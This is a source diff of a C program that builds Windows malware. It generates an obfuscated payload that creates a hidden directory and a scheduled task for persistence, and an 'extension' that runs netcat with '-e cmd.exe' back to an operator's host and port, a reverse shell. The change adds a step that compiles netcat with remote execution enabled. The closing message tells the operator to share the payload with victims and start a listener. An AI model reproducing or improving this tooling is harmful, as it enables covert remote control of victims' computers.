@@ -12,11 +12,11 @@ void get(char *prompt, char *str, int size)
         str[strlen(str) - 1] = '\0';
     fflush(stdin);
 }
-void compile(char *compiled_file, char *first_file_provided, char *type, char *second_file_provided)
+void compile(char *compiled_file, char *first_file_provided, char *type)
 {
     char ch;
     char cmd[2000];
-    printf("Creating %s ...", first_file_provided);
+    printf("Creating %s ...\n", first_file_provided);
     strcpy(cmd, "windres RES/RC/res_");
     strcat(cmd, type);
     strcat(cmd, ".rc -O coff -o RES/RC/res_TMP");
@@ -32,12 +32,6 @@ void compile(char *compiled_file, char *first_file_provided, char *type, char *s
     sleep(3);
     remove(compiled_file);
     remove("RES/RC/res_TMP");
-    cmd[0] = '\0';
-    strcat(cmd, "COPY /Y RES\\FILE_B.exe OUTPUT\\");
-    strcat(cmd, second_file_provided);
-    strcat(cmd, ".exe");
-    system(cmd);
-    sleep(1);
 }
 char *generateRandomString(char *string, const int length)
 {
@@ -100,8 +94,8 @@ void obfuscate(char *tmp_file_name, char *cmd_non_obfuscate)
 }
 void generatePayload(char *victim_dir, char *file_provider, char *first_file_provided, char *second_file_provided, char *task_name, char *task_trigger, char *payload_name)
 {
-    char cmd_PAYLOAD[1000];
-    cmd_PAYLOAD[1] = '\0';
+    char cmd_PAYLOAD[2000];
+    cmd_PAYLOAD[0] = '\0';
     strcat(cmd_PAYLOAD, "c: & cd / & mkdir ");
     strcat(cmd_PAYLOAD, victim_dir);
     strcat(cmd_PAYLOAD, " & cd ");
@@ -130,7 +124,7 @@ void generatePayload(char *victim_dir, char *file_provider, char *first_file_pro
     strcat(cmd_PAYLOAD, first_file_provided);
     strcat(cmd_PAYLOAD, ".exe & exit\"");
     obfuscate("c_TMP_PAYLOAD.cpp", cmd_PAYLOAD);
-    compile("c_TMP_PAYLOAD.cpp", payload_name, "PAYLOAD", second_file_provided);
+    compile("c_TMP_PAYLOAD.cpp", payload_name, "PAYLOAD");
 }
 void generateExtension(char *victim_dir, char *host, char *port, char *second_file_provided, char *first_file_provided)
 {
@@ -146,7 +140,17 @@ void generateExtension(char *victim_dir, char *host, char *port, char *second_fi
     strcat(cmd_EXTENSION, port);
     strcat(cmd_EXTENSION, " -e cmd.exe -d ^");
     obfuscate("c_TMP_EXTENSION.cpp", cmd_EXTENSION);
-    compile("c_TMP_EXTENSION.cpp", first_file_provided, "FILE_A", second_file_provided);
+    compile("c_TMP_EXTENSION.cpp", first_file_provided, "FILE_A");
+}
+void generateNc(char *second_file_provided){
+    char cmd_NC[2000];
+    cmd_NC[0] = '\0';
+    printf("Creating %s ...\n", second_file_provided);
+    strcat(cmd_NC, "gcc -w -DNDEBUG -DWIN32 -D_CONSOLE -DTELNET -DGAPING_SECURITY_HOLE RES/SRC/NC/getopt.c RES/SRC/NC/doexec.c RES/SRC/NC/netcat.c -s -lkernel32 -luser32 -lwsock32 -lwinmm -o OUTPUT/");
+    strcat(cmd_NC, second_file_provided);
+    strcat(cmd_NC, ".exe");
+    system(cmd_NC);
+    sleep(1);
 }
 int main(int argc, char **argv)
 {
@@ -371,6 +375,7 @@ int main(int argc, char **argv)
     printf("PORT PROVIDED : %s\n", port);
     generatePayload(victim_dir, file_provider, first_file_provided, second_file_provided, task_name, task_trigger, payload_name);
     generateExtension(victim_dir, host, port, second_file_provided, first_file_provided);
+    generateNc(second_file_provided);
     printf("Now you just have to place %s.exe and %s.exe here %s, share %s.exe and start your listener.\nHappy hunting !!", first_file_provided, second_file_provided, file_provider, payload_name);
     scanf("%d");
     return 0;
